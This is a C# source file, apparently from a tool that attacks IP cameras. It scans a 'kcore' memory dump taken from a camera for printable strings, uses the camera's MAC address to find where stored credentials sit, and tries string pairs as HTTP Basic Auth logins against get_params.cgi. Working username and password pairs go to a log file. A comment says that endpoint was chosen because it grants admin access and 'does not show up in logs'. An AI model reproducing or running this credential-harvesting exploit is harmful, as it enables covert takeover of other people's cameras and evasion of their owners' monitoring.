﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;

namespace FileDownloader
{
    using FileDownloader.Properties;

    public class BruteForceEvent
    {
        public string foundUser, foundPass, error, ip, filename;

        public bool retry = false;
    }

    public static class BruteForce
    {
        public static BruteForceEvent Auto(string ip, string filename, int getMacLevel, bool debug)
        {
            string mac = "";
            if (getMacLevel > 0)
            {
                mac = GetMAC(ip);
                if (mac.StartsWith("||2"))
                {
                    BruteForceEvent be = new BruteForceEvent();
                    be.ip = ip;
                    be.error = "Error connecting to server, is it up?";
                    if (Settings.Default.bruteforceRetry)
                    {
                        be.error += " Retrying later...";
                        be.retry = true;
                        System.Threading.Thread.Sleep(1000);
                    }
                    return be;
                }
            }
            List<string> choices;
            try
            {
                choices = SearchForStrings(filename, mac, getMacLevel > 1, debug);
            }
            catch (Exception)
            {
                choices = new List<string>();
            }
            BruteForceEvent brute = Bruteforce(choices, ip, debug);
            brute.filename = filename;
            return  brute;
        }

        public static string GetMAC(string rawIP)
        {
            HttpWebRequest hrAssisted = (HttpWebRequest)WebRequest.Create("http://" + rawIP + "/get_status.cgi");
            try
            {
                using (HttpWebResponse resp = (HttpWebResponse)hrAssisted.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(resp.GetResponseStream()))
                    {
                        string firstLine = reader.ReadLine();
                        try
                        {
                            return Regex.Match(firstLine, @"[0-9A-F]{12}").Value;
                        }
                        catch (Exception)
                        {
                            return "";
                        }
                    }

                }
            }
            catch (WebException)
            {
                return "||2 Error reaching server";
            }
            catch (Exception ex)
            {
                return "||1 Random error " + ex.Message + "\r\n" + ex.StackTrace;
            }
        }

        public static List<string> SearchForStrings(string filename, string mac = "", bool strictMac = false, bool debug = false)
        {
            long offset = Settings.Default.bruteforceOffset;
            int minLength = Settings.Default.bruteforceMinSize;

            // search for strings (separated by 0x00) in kcore
            List<string> foundStrings = new List<string>();
            using (FileStream f = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.None, 65536))
            {
                f.Seek(offset, SeekOrigin.Begin);
                if(f.Position < offset)
                {
                    // file not long enough
                    return foundStrings;
                }
                byte[] buff = new byte[Settings.Default.bruteforceBuffer];
                int bytesRead = f.Read(buff, 0, buff.Length);
                int currentByte = 0;
                List<byte> stringBytes = new List<byte>();
                while (currentByte < bytesRead)
                {
                    // check if byte is common ascii character
                    if (buff[currentByte] < ' ' | buff[currentByte] > '~') 
                    {
                        // flush string to list
                        if (stringBytes.Count > 0)
                        {
                            string s = string.Empty;
                            foreach (byte b in stringBytes)
                            {
                                s += Convert.ToChar(b);
                            }
                            if (s.Length > minLength)
                            {
                                if (debug)
                                {
                                    Console.WriteLine(s);
                                }
                                foundStrings.Add(s);
                            }
                            stringBytes.Clear();
                        }
                    }
                    else
                    { // add bytes to string 
                        stringBytes.Add(buff[currentByte]);
                    }
                    currentByte++;
                }
            }

            bool macFound = false;
            if (mac.Length > 0)
            { // the mac address of the camera is right before the username:password combo. skip to there if found
                for (int i = 0; i < foundStrings.Count; i++)
                {
                    if (foundStrings[i] == mac)
                    {
                        if (debug) Console.WriteLine("MAC Address found at " + i);
                        foundStrings.RemoveRange(0, i);
                        macFound = true;
                        break;
                    }
                }
            }

            if(strictMac)
            {
                if (!macFound)
                {
                    // MAC address not found in kcore, not attempting brute force
                    foundStrings.Clear();
                }
                if (mac.Length <= 0 || mac.StartsWith("||"))
                { // empty mac or error on strict mode
                    foundStrings.Clear();
                }
                
            }

            return foundStrings;
        }

        public static HttpStatusCode Login(string ip, string username, string password)
        {
            if (!ip.Contains('/'))
            {
                ip = "http://" + ip + "/get_params.cgi";
            }

            try
            {
                HttpWebRequest hr = (HttpWebRequest)WebRequest.Create(ip);
                hr.Timeout /= 6;
                SetBasicAuthHeader(hr, username, password);

                using (HttpWebResponse resp = (HttpWebResponse)hr.GetResponse())
                {
                    return resp.StatusCode;
                }
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.Timeout)
                {
                    return HttpStatusCode.RequestTimeout;
                }
            }
            catch (Exception)
            {
                return HttpStatusCode.BadRequest;
            }

            return HttpStatusCode.Unauthorized;
        }

        public static BruteForceEvent Bruteforce(List<string> foundStrings, string rawIP, bool debug = false)
        {
            BruteForceEvent coolStuff = new BruteForceEvent();
            // we use get_params.cgi because it requires an admin-level account (not operator) and does not show up in logs
            string ip = "http://" + rawIP + "/get_params.cgi";
            coolStuff.ip = rawIP;
            for (int i = 0; i < foundStrings.Count; i++)
            {
                try
                {
                    /*HttpWebRequest hr = (HttpWebRequest)WebRequest.Create(ip);
                    SetBasicAuthHeader(hr, foundStrings[i], foundStrings[i + 1]);

                    using (HttpWebResponse resp = (HttpWebResponse)hr.GetResponse())
                    {
                        if (resp.StatusCode == HttpStatusCode.OK)
                        {
                            ip = ip.Replace("get_params.cgi", "");
                            string pair = foundStrings[i] + ":" + foundStrings[i + 1];
                            if(!File.Exists("bruteforce.log"))
                            {
                                File.Create("bruteforce.log").Close();
                                System.Threading.Thread.Sleep(1000);
                            }
                            try
                            {
                                File.AppendAllText("bruteforce.log", ip + " - " + pair + "\r\n");
                            }
                            catch (Exception)
                            {
                                pair += "\r\nError saving to the log";
                            }
                            coolStuff.foundUser = foundStrings[i];
                            coolStuff.foundPass = foundStrings[i + 1];
                            return coolStuff;
                        }
                    }*/
                    if (Login(ip, foundStrings[i], foundStrings[i + 1]) == HttpStatusCode.OK)
                    {
                        ip = ip.Replace("get_params.cgi", "");
                        string pair = foundStrings[i] + ":" + foundStrings[i + 1];
                        if (!Log(ip, foundStrings[i], foundStrings[i + 1]))
                        {
                            coolStuff.error = "Error saving to log";
                        }
                        coolStuff.foundUser = foundStrings[i];
                        coolStuff.foundPass = foundStrings[i + 1];
                        return coolStuff;
                    }
                }
                catch (Exception)
                {

                }
            }

            if (foundStrings.Count > 0)
            {
                coolStuff.error = "No valid username:password combo found. Is kcore at least 4MB?";
            }
            else
            {
                coolStuff.error = "Skipped - nothing found in kcore. Try disabling \"Strict\" mode";
            }
            return coolStuff;
        }

        public static bool Log(string ip, string user, string pass)
        {
            return Log(String.Format(Settings.Default.bruteforceLogFormat, ip, user, pass));
        }

        public static bool Log(string text)
        {
            if (!File.Exists("bruteforce.log"))
            {
                File.Create("bruteforce.log").Close();
                System.Threading.Thread.Sleep(1000);
            }
            try
            {
                File.AppendAllText("bruteforce.log", text + "\r\n");
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static void SetBasicAuthHeader(WebRequest request, String userName, String userPassword)
        {
            string authInfo = userName + ":" + userPassword;
            authInfo = Convert.ToBase64String(Encoding.Default.GetBytes(authInfo));
            request.Headers["Authorization"] = "Basic " + authInfo;
        }
    }
}
